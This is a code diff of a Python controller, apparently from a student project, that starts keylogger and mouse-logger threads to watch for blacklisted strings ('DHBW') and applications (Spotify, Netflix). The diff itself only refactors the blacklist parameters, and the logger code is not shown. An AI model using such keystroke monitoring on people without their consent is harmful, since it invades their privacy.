@@ -11,10 +11,9 @@ Starts any module in a seperate thread to ensure smooth sailing
 """
 class CitizenController:
 
-    def __init__(self, citizen, blackListWords, blackListSentences, blackListTasks) -> None:
+    def __init__(self, citizen, blackListStrings, blackListTasks) -> None:
         self.citizen = citizen
-        self.blackListWords = blackListWords
-        self.blackListSentences = blackListSentences
+        self.blackListStrings = blackListStrings
         self.blackListTasks = blackListTasks
 
     """
@@ -23,7 +22,7 @@ class CitizenController:
     """
     def start(self):
         QUERY_CONTROLLER = QueryController()
-        KEYLOGGER = KeyLogger(QUERY_CONTROLLER, self.blackListWords, self.blackListSentences)
+        KEYLOGGER = KeyLogger(QUERY_CONTROLLER, self.blackListStrings)
         thr1 = threading.Thread(target=KEYLOGGER.main, args=())
         thr1.start()
         MOUSELOGGER = MouseLogger(QUERY_CONTROLLER)
@@ -37,5 +36,5 @@ class CitizenController:
 Start the controller.py script by initializing a controller object and running the start method
 """
 if __name__ == "__main__":
-    CITIZEN_CONTROLLER = CitizenController(None,["awd"], ["jwt jwt"], ['Spotify', 'Google Chrome'])
+    CITIZEN_CONTROLLER = CitizenController(None, ["DHBW", "Python ist gut"], ['Spotify', 'Netflix'])
     CITIZEN_CONTROLLER.start()
